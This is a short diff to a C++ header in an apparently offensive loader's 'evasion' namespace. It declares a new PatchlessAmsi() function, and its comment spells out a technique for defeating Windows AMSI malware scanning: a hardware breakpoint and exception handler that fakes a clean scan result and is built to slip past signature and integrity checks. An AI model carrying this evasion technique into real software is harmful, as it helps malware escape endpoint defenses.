@@ -22,6 +22,21 @@ namespace evasion {
     // Requires CONFIG_AMSI_BYPASS_TYPE >= 3.
     BOOL InvalidateAmsiContext();
 
+    // Patchless bypass: arm a hardware execute breakpoint (Dr0) on the
+    // first instruction of AmsiScanBuffer and install a vectored exception
+    // handler that intercepts the resulting #DB. The handler writes
+    // AMSI_RESULT_CLEAN to the caller's result pointer (6th arg), forges
+    // a return (RAX=S_OK, RIP=[RSP], RSP+=8) and continues execution -
+    // AmsiScanBuffer's code itself is never run and its bytes are never
+    // modified, defeating PG/CFG integrity checks and signature scans
+    // that look for the classic xor/ret patch. Coverage is limited to
+    // threads with Dr0 set: this implementation arms the current thread
+    // only - sufficient when the loader executes AMSI-relevant code on
+    // its own thread (e.g. self-inject + .NET assembly load).
+    // Refs: CCob patchless-AMSI gist, CrowdStrike patchless analysis.
+    // Requires CONFIG_AMSI_BYPASS_TYPE >= 4.
+    BOOL PatchlessAmsi();
+
 } // namespace evasion
 } // namespace erebus
 
